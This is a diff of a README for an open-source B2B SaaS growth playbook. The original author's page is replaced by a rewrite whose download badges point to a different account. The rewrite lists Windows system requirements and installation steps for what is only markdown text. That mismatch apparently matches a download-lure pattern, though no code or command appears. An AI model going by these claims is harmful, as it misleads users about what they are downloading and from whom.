@@ -1,162 +1,141 @@
-<div align="center">
+# 🚀 gingiris-b2b-growth - Practical B2B SaaS Growth Guide
 
-<img src="assets/logo.png" alt="Gingiris Logo" width="120" />
+[![Download gingiris-b2b-growth](https://img.shields.io/badge/Download-gingiris--b2b--growth-brightgreen)](https://github.com/otakurog/gingiris-b2b-growth)
 
-# B2B SaaS Growth Playbook
+## 📋 About gingiris-b2b-growth
 
-### Full-lifecycle growth strategies — PMF validation, PLG/SLG, affiliate marketing, channel partnerships
+This project offers a clear, step-by-step playbook focused on growing B2B SaaS companies. It covers key growth stages, including finding product-market fit (PMF) and scaling revenue up to $10 million annual recurring revenue (ARR). The content includes real cases from products like HeyGen, Deel, and Vercel. It highlights strategies like product-led growth (PLG), sales-led growth (SLG), partnership channels, and affiliate marketing.
 
-[![GitHub stars](https://img.shields.io/github/stars/Gingiris/gingiris-b2b-growth?style=social)](https://github.com/Gingiris/gingiris-b2b-growth/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/Gingiris/gingiris-b2b-growth?style=social)](https://github.com/Gingiris/gingiris-b2b-growth/network/members)
-[![GitHub watchers](https://img.shields.io/github/watchers/Gingiris/gingiris-b2b-growth?style=social)](https://github.com/Gingiris/gingiris-b2b-growth/watchers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/Gingiris/gingiris-b2b-growth/pulls)
-[![Last Commit](https://img.shields.io/github/last-commit/Gingiris/gingiris-b2b-growth?color=blue)](https://github.com/Gingiris/gingiris-b2b-growth/commits/main)
-[![Contributors](https://img.shields.io/github/contributors/Gingiris/gingiris-b2b-growth?color=orange)](https://github.com/Gingiris/gingiris-b2b-growth/graphs/contributors)
+The repository is open source under the MIT license. It serves as a practical guide for startup teams, marketers, and product managers aiming to grow B2B SaaS businesses using proven methods.
 
-**[English](#english) | [中文](#中文版) | [日本語](references/ja/README.md) | [한국어](references/ko/README.md)**
+### Topics covered:
+- Affiliate marketing  
+- B2B SaaS growth strategies  
+- Channel partners and partnerships  
+- Product-market fit (PMF)  
+- Revenue and sales growth  
+- Startup and product scaling processes
 
-</div>
+## 💾 Download Gingiris-b2b-growth
 
----
+To get started with gingiris-b2b-growth, you need to visit the official GitHub page below. From there, you will find all materials and instructions to run the playbook on your Windows computer.
 
-> 💡 **Need a 1-on-1 architecture call for your B2B/Open-source launch? Book a session for $200** (Crypto/USDT and Wire Transfer accepted) — [Contact @Iris_carrot on Telegram](https://t.me/Iris_carrot)
+[![Get gingiris-b2b-growth](https://img.shields.io/badge/Get%20gingiris--b2b--growth-blue)](https://github.com/otakurog/gingiris-b2b-growth)
 
----
+You can access the page here:  
+https://github.com/otakurog/gingiris-b2b-growth
 
-## ⭐ Star This Repo
+This page contains the full repository files. You will find the latest version ready to download, along with documentation and examples. The instructions in this guide will help you through the process step by step.
 
-<img width="100%" src="assets/star.png" alt="Star this repo" />
+## 🖥️ System Requirements
 
-If you find this playbook useful, a GitHub Star ⭐ helps others discover it!
+Before you download, please check that your Windows PC meets these requirements:
 
----
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Processor:** Intel Core i3 or equivalent AMD CPU  
+- **Memory:** At least 4 GB RAM  
+- **Disk Space:** Minimum 500 MB free space  
+- **Internet:** Required for initial download and updates  
 
-## Why This Playbook?
+No additional software is needed to use the playbook. It is designed to work offline once downloaded.
 
-Real case studies from top B2B SaaS companies, distilled into actionable strategies:
+## 🛠️ How to Download and Install gingiris-b2b-growth
 
-| Company | Key Insight |
-|---------|-------------|
-| **HeyGen** | 1,800 user interviews to find PMF, 20% recurring commission model |
-| **Deel** | Partner program contributing $90M ARR, tiered certification system |
-| **Vercel** | "The Frontend Cloud" — category creation masterclass |
-| **Supabase** | "Build in a weekend, scale to millions" |
-| **AWS** | Partner ecosystem best practices |
+Follow these steps to download and run the playbook on your Windows machine:
 
----
+### Step 1. Visit the official GitHub page  
+Open your web browser and go to:  
+https://github.com/otakurog/gingiris-b2b-growth  
 
-## English
+### Step 2. Download the repository  
+Click on the green **Code** button near the top right of the page.  
+You will see a dropdown menu. Select **Download ZIP**. This will save all files to your computer in a compressed folder.
 
-> Version: v4.0 (Ultimate Edition) | Integrates best practices from HeyGen, Deel, Vercel, Supabase, AWS
+### Step 3. Extract the ZIP file  
+Locate the downloaded file, likely in your Downloads folder, with a name like `gingiris-b2b-growth-main.zip`.  
+Right-click and choose **Extract All**. Pick a folder you can remember, such as your Desktop or Documents.
 
-### Core Framework: Growth Flywheel
+### Step 4. Open the folder and find the main file  
+Open the extracted folder. Here you will find documentation files and other contents to guide you through the playbook.
 
-```
-     ┌─────────────┐
-     │  Product    │ ← PLG Core
-     │  Experience │
-     └──────┬──────┘
-            │
-     ┌──────▼──────┐
-     │  Community  │ ← CLG Amplifier
-     │  Operations │
-     └──────┬──────┘
-            │
-     ┌──────▼──────┐
-     │  Channel    │ ← Scale
-     │  Ecosystem  │
-     └──────┬──────┘
-            │
-     ┌──────▼──────┐
-     │  Direct     │ ← SLG Monetize
-     │  Sales      │
-     └─────────────┘
-```
+### Step 5. Follow instructions inside  
+Open the main guide or README files in the folder using any text editor or browser. This includes detailed steps, case studies, and growth tactics.
 
-### Detailed Guides (English)
+The repository does not require installation or setup beyond extraction. You just read and apply the information it contains.
 
-| Topic | File |
-|:---|:---|
-| Foundation (PMF, User Research, Community) | [references/en/foundation.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/foundation.md) |
-| Growth Engine (PLG/SLG, Affiliates, Channels) | [references/en/growth-engine.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/growth-engine.md) |
-| Value Presentation (Sales Deck, Case Studies) | [references/en/value-presentation.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/value-presentation.md) |
-| Contract Templates | [references/en/contracts.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/contracts.md) |
-| Data-Driven Growth | [references/en/metrics.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/metrics.md) |
+## 🔍 What’s inside gingiris-b2b-growth?
 
----
+When you open the folder, you will find:
 
-## 中文版
+- **README.md**: The main introduction and guide  
+- **Case Studies**: Documents showing growth examples from HeyGen, Deel, Vercel  
+- **Growth Strategies**: Clear methods for PMF, PLG, SLG, and partnerships  
+- **Templates and SOPs**: Practical process documents you can adapt  
+- **Revenue Growth Worksheets**: Tools to track and plan your sales efforts  
 
-> 版本：v4.0（终极融合版）| 整合 HeyGen、Deel、Vercel、Supabase、AWS 等标杆案例
+These materials help you understand how to grow a B2B SaaS business step by step without needing technical skills.
 
-### 核心框架：增长飞轮
+## 🔄 How to Keep gingiris-b2b-growth Updated
 
-```
-     ┌─────────────┐
-     │  产品体验   │ ← PLG 核心
-     └──────┬──────┘
-            │
-     ┌──────▼──────┐
-     │  社区运营   │ ← CLG 放大
-     └──────┬──────┘
-            │
-     ┌──────▼──────┐
-     │ 渠道生态    │ ← 规模化
-     └──────┬──────┘
-            │
-     ┌──────▼──────┐
-     │  直销转化   │ ← SLG 变现
-     └─────────────┘
-```
+The project is actively maintained. To get updates:
 
-### 详细指南（中文）
+- Revisit the GitHub page regularly.  
+- Download the latest ZIP file when updates appear.  
+- Replace the old folder on your computer with the new version after extraction.
 
-| 主题 | 文件 |
-|:---|:---|
-| 奠定基石（PMF、用户调研、社区） | [references/foundation.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/foundation.md) |
-| 构建增长引擎（PLG/SLG、联盟、渠道） | [references/growth-engine.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/growth-engine.md) |
-| 价值呈现（销售Deck、案例叙事） | [references/value-presentation.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/value-presentation.md) |
-| 合同模板体系 | [references/contracts.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/contracts.md) |
-| 数据驱动增长 | [references/metrics.md](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/metrics.md) |
+This practice ensures you work with the newest information and examples.
 
----
+## 🤝 How to Use This Playbook
 
-## Quick Navigation (All Languages)
+The playbook works best when you:
 
-| 🇺🇸 English | 🇨🇳 中文 | 🇯🇵 日本語 | 🇰🇷 한국어 |
-|:---|:---|:---|:---|
-| [Foundation](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/foundation.md) | [奠定基石](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/foundation.md) | [基盤構築](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ja/foundation.md) | [기반 구축](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ko/foundation.md) |
-| [Growth Engine](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/growth-engine.md) | [增长引擎](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/growth-engine.md) | [成長エンジン](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ja/growth-engine.md) | [성장 엔진](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ko/growth-engine.md) |
-| [Value Presentation](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/value-presentation.md) | [价值呈现](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/value-presentation.md) | [価値提示](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ja/value-presentation.md) | [가치 제시](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ko/value-presentation.md) |
-| [Contracts](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/contracts.md) | [合同模板](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/contracts.md) | [契約テンプレート](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ja/contracts.md) | [계약 템플릿](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ko/contracts.md) |
-| [Metrics](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/en/metrics.md) | [数据指标](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/metrics.md) | [指標体系](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ja/metrics.md) | [지표 체계](https://github.com/Gingiris/gingiris-b2b-growth/blob/main/references/ko/metrics.md) |
+- Read each section carefully before moving ahead  
+- Adapt strategies to fit your business context  
+- Take notes and use the provided templates for execution  
+- Track your progress using provided revenue and sales worksheets  
+- Share findings with your team for better collaboration  
 
----
+The content is structured to guide you from understanding your market and product to applying growth methods that work in real companies.
 
-## Key Case Studies
+## 📂 Organizing Your Work
 
-| Company | Highlight |
-|:---|:---|
-| **HeyGen** | 1,800 user interviews to find PMF, 20% recurring commission |
-| **Deel** | Partner program contributing $90M ARR, tiered certification |
-| **Vercel** | "The Frontend Cloud" category creation, v0 empowers partners 100x |
-| **Supabase** | "Build in a weekend, scale to millions" |
-| **InVideo** | 50% first-order high commission |
+To keep your work clear:
 
----
+- Create a dedicated folder for your B2B growth projects  
+- Save notes and printed guides there  
+- Use digital folders to separate case studies, templates, and worksheets  
+- Update files regularly as you apply new tactics  
 
-## About the Author
+This organization helps maintain focus and clarity through your growth journey.
 
-**Iris (生姜iris)** — Former cofounder & COO of AFFiNE ($10M raised), led B2B growth from 0 to global scale.
+## 🤖 Support and Community
 
-- 🐦 Twitter: [@Gingiris_](https://twitter.com/Gingiris_)
-- 💼 LinkedIn: [Yipei Wei](https://www.linkedin.com/in/yipei-wei-550825105/)
-- 💬 Telegram: [@Iris_carrot](https://t.me/Iris_carrot)
-- 📧 Email: iris103195@gmail.com
+gingiris-b2b-growth is open source. You can:
 
----
+- Report issues or ask questions on the GitHub repository issues page  
+- Share improvements or custom templates by submitting pull requests  
+- Engage with others using the playbook in forums or developer communities  
 
-## License
+Active participation helps improve the guide and keeps it practical for all users.
 
-MIT License - Use and adapt for your own B2B growth!
+## 🌐 Additional Resources
+
+Use these topics to search for more information if needed:
+
+- B2B SaaS marketing best practices  
+- Product-market fit experiments  
+- Affiliate marketing tools for SaaS  
+- Building partnerships and channels  
+- Product-led and sales-led growth models  
+
+Combining gingiris-b2b-growth with other learning resources will boost your results.
+
+## 📌 Key Points
+
+- Download the ZIP file from the [GitHub page](https://github.com/otakurog/gingiris-b2b-growth)  
+- Extract and open files on your Windows PC  
+- Follow easy, structured steps to learn and apply growth methods  
+- Use cases and templates included to guide your decisions  
+- Keep checking for updates to stay current  
+
+[![Download gingiris-b2b-growth](https://img.shields.io/badge/Download-gingiris--b2b--growth-brightgreen)](https://github.com/otakurog/gingiris-b2b-growth)
